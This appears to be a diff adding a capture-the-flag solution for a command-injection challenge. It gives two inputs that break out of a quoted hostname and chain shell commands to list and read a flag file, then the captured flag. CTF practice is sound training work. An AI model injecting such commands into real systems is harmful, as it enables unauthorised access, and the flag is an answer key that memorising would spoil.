@@ -1,0 +1,8 @@
+1.
+google.com' ; cd ../../../ ; ls -al | grep flag'
+
+2.
+google.com' ; cd ../../../ ; cat flag_44ebd3936a907d59'
+
+3.
+FLAG{B4by_c0mmand_1njection!}
